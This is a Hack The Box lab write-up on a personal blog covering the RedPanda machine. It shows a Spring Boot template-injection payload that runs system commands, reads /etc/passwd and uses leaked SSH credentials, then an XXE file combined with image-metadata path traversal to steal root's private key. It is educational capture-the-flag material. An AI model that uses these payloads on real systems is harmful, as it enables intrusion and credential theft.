<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="UnJN0X8aSA7Vas0N6FhAFn-PjFV-OU0wZh9gGAnWM0o"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB RedPanda" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="Footprinting" /><meta property="og:description" content="Footprinting" /><link rel="canonical" href="congkhainguyen.github.io/pentesting/htb/machines/redpanda" /><meta property="og:url" content="congkhainguyen.github.io/pentesting/htb/machines/redpanda" /><meta property="og:site_name" content="Kaiba_404’s Blog" /><meta property="og:image" content="congkhainguyen.github.io/assets/img/hackthebox/card/RedPanda.png" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-27T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="congkhainguyen.github.io/assets/img/hackthebox/card/RedPanda.png" /><meta property="twitter:title" content="HTB RedPanda" /><meta name="twitter:site" content="@giangkhail12999" /><meta name="twitter:creator" content="@Zeropio" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio"},"dateModified":"2022-08-27T00:00:00+02:00","datePublished":"2022-08-27T00:00:00+02:00","description":"Footprinting","headline":"HTB RedPanda","image":{"width":800,"height":500,"url":"congkhainguyen.github.io/assets/img/hackthebox/card/RedPanda.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"congkhainguyen.github.io/pentesting/htb/machines/redpanda"},"url":"congkhainguyen.github.io/pentesting/htb/machines/redpanda"}</script><title>HTB | RedPanda | Kaiba_404's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Kaiba_404's Blog"><meta name="application-name" content="Kaiba_404's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Kaiba_404's Blog</a></div><div class="site-subtitle font-italic">CyberSec Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fa fa-list ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fa fa-globe ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fa fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fa fa-user ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/CongKhaiNGUYEN" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/giangkhail12999" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB | RedPanda</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB | RedPanda</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661551200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 27, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="/assets/img/hackthebox/card/RedPanda.png" class="preview-img bg" alt="Preview Image" width="800" height="500" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> Cong Khai NGUYEN </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="701 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><h1 id="footprinting">Footprinting</h1><p>We start with a nmap to the discover ports:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.11.170
Host is up (0.072s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 27 Aug 2022 21:13:22 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en" dir="ltr"&gt;
...

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>If we check the webpage we will find the following page:</p><p><img data-src="/assets/img/hackthebox/labs/redpanda/Untitled.png" alt="Untitled" data-proofer-ignore></p><h1 id="foothold">Foothold</h1><p>We can try several payloads, until we find that <code class="language-plaintext highlighter-rouge">*{7*7}</code> the output is <code class="language-plaintext highlighter-rouge">49</code>. If we try the following payload:</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="p">{</span><span class="kd">class</span><span class="p">.</span><span class="nf">getResource</span><span class="p">(</span><span class="dl">""</span><span class="p">).</span><span class="nf">getPath</span><span class="p">()}</span>
</pre></table></code></div></div><p>We will get <strong>Whitelabel Error Page</strong>. Searching it, we will find that is about <strong>Spring Boot</strong>. The following payload, from PayloadAllTheThings will work:</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">$</span><span class="p">{</span><span class="nc">T</span><span class="p">(</span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">IOUtils</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">).</span><span class="nf">getRuntime</span><span class="p">().</span><span class="nf">exec</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">99</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">97</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">116</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">32</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">47</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">101</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">116</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">99</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">47</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">112</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">97</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">115</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">115</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">119</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="nc">T</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Character</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">100</span><span class="p">))).</span><span class="nf">getInputStream</span><span class="p">())}</span>
</pre></table></code></div></div><p>It will give us the <code class="language-plaintext filepath highlighter-rouge">/etc/passwd</code>. We can use <a href="[https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py](https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py)">this</a> script to execute a webshell as follows to create our payloads:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>./ssti-payload.py
<span class="go">
</span><span class="gp">Command ==&gt;</span><span class="w"> </span><span class="nb">id</span>
<span class="gp">$</span><span class="o">{</span>T<span class="o">(</span>org.apache.commons.io.IOUtils<span class="o">)</span>.toString<span class="o">(</span>T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>T<span class="o">(</span>java.lang.Character<span class="o">)</span>.toString<span class="o">(</span>105<span class="o">)</span>.concat<span class="o">(</span>T<span class="o">(</span>java.lang.Character<span class="o">)</span>.toString<span class="o">(</span>100<span class="o">)))</span>.getInputStream<span class="o">())}</span>
</pre></table></code></div></div><p>With this we can generate our payloads to move on, start by getting our user with a <code class="language-plaintext highlighter-rouge">whoami</code> (and replacing all the <code class="language-plaintext highlighter-rouge">$</code> by <code class="language-plaintext highlighter-rouge">*</code> .</p><p>We can search in the config file: <code class="language-plaintext highlighter-rouge">/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code> {: .filepath}. There we can see the escaped characters (not the <code class="language-plaintext highlighter-rouge">*</code> ) and a pair of credentials ( <strong>woodenk</strong>:<strong>RedPandazRule</strong> ), we can try ssh with them:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ssh woodenk@&lt;IP&gt;
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><p>If we run:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">woodenk@redpanda:~$</span><span class="w"> </span>ps aux | <span class="nb">grep </span>root
<span class="go">
root         866  0.0  0.0   2608   600 ?        Ss   16:54   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</span></pre></table></code></div></div><p>We can see that root user is executing something with our user. Inside the <code class="language-plaintext highlighter-rouge">/opt</code> {: .filepath} we can see some kind of scripts with the following content:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
/usr/bin/find /tmp <span class="nt">-name</span> <span class="s2">"*.xml"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /var/tmp <span class="nt">-name</span> <span class="s2">"*.xml"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /dev/shm <span class="nt">-name</span> <span class="s2">"*.xml"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /home/woodenk <span class="nt">-name</span> <span class="s2">"*.xml"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /tmp <span class="nt">-name</span> <span class="s2">"*.jpg"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /var/tmp <span class="nt">-name</span> <span class="s2">"*.jpg"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /dev/shm <span class="nt">-name</span> <span class="s2">"*.jpg"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
/usr/bin/find /home/woodenk <span class="nt">-name</span> <span class="s2">"*.jpg"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
</pre></table></code></div></div><p>We can see that it is deleting files with the XML version. If we go back to the webpage, we can see that in the user’s profiles we can download an XML about them.</p><p>In the previous file we can found how the XML is exported. If we check on the folder of the script we can find another file that is using the User-Agent:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Map</span> <span class="nf">parseLog</span><span class="o">(</span><span class="nc">String</span> <span class="n">line</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span><span class="o">[]</span> <span class="n">strings</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"\\|\\|"</span><span class="o">);</span>
        <span class="nc">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"status_code"</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"ip"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user_agent"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"uri"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]);</span>
</pre></table></code></div></div><p>And below the metadata of a file with a <em>Artist</em> parameter:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">getArtist</span><span class="o">(</span><span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span>
    <span class="o">{</span>
        <span class="nc">String</span> <span class="n">fullpath</span> <span class="o">=</span> <span class="s">"/opt/panda_search/src/main/resources/static"</span> <span class="o">+</span> <span class="n">uri</span><span class="o">;</span>
        <span class="nc">File</span> <span class="n">jpgFile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">fullpath</span><span class="o">);</span>
        <span class="nc">Metadata</span> <span class="n">metadata</span> <span class="o">=</span> <span class="nc">JpegMetadataReader</span><span class="o">.</span><span class="na">readMetadata</span><span class="o">(</span><span class="n">jpgFile</span><span class="o">);</span>
        <span class="k">for</span><span class="o">(</span><span class="nc">Directory</span> <span class="n">dir</span> <span class="o">:</span> <span class="n">metadata</span><span class="o">.</span><span class="na">getDirectories</span><span class="o">())</span>
        <span class="o">{</span>
            <span class="k">for</span><span class="o">(</span><span class="nc">Tag</span> <span class="n">tag</span> <span class="o">:</span> <span class="n">dir</span><span class="o">.</span><span class="na">getTags</span><span class="o">())</span>
            <span class="o">{</span>
                <span class="k">if</span><span class="o">(</span><span class="n">tag</span><span class="o">.</span><span class="na">getTagName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"Artist"</span><span class="o">)</span>
</pre></table></code></div></div><p>We could try to do a XXE and aim the metadata of this file to this malicious file. The <code class="language-plaintext highlighter-rouge">exiftool</code> could be useful to inject metadata inside an image:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>exiftool <span class="nt">-Artist</span><span class="o">=</span><span class="s2">"../../../../../../../../../home/woodenk/xxe"</span> dog.jpeg
</pre></table></code></div></div><p>As the program add <code class="language-plaintext highlighter-rouge">_creds.xml</code> to the file name we just need to name the name before. Create the XML file (must have the same parameters as the others):</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"&gt;</span> ]&gt;
<span class="nt">&lt;credits&gt;</span>
  <span class="nt">&lt;author&gt;</span>damian<span class="nt">&lt;/author&gt;</span>
  <span class="nt">&lt;image&gt;</span>
    <span class="nt">&lt;uri&gt;</span>/../../../../../../../home/woodenk/dog.jpeg<span class="nt">&lt;/uri&gt;</span>
    <span class="nt">&lt;privesc&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/privesc&gt;</span>
    <span class="nt">&lt;views&gt;</span>0<span class="nt">&lt;/views&gt;</span>
  <span class="nt">&lt;/image&gt;</span>
  <span class="nt">&lt;totalviews&gt;</span>0<span class="nt">&lt;/totalviews&gt;</span>
<span class="nt">&lt;/credits&gt;</span>
</pre></table></code></div></div><p>Call the image:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>curl http://10.10.11.170:8080 <span class="nt">-H</span> <span class="s2">"User-Agent: ||/../../../../../../../home/woodenk/dog.jpeg"</span>
</pre></table></code></div></div><p>And download the XML from the user. Check again the XXE and we should have the root RSA there.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting/'>Pentesting</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/machines/" class="post-tag no-text-decoration" >machines</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB+%7C+RedPanda+-+Kaiba_404%27s+Blog&url=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fredpanda" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB+%7C+RedPanda+-+Kaiba_404%27s+Blog&u=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fredpanda" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fredpanda&text=HTB+%7C+RedPanda+-+Kaiba_404%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/ctf-like/reversing/crackme-packed">Reversing | CrackMe Packed</a><li><a href="/index">Index</a><li><a href="/malware/development/dropper-explorer-1">MalDev | Dropper Explorer.exe</a><li><a href="/malware/development/putty-1">MalDev | Putty</a><li><a href="/pentesting/htb/machines/arctic">HTB | Arctic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div 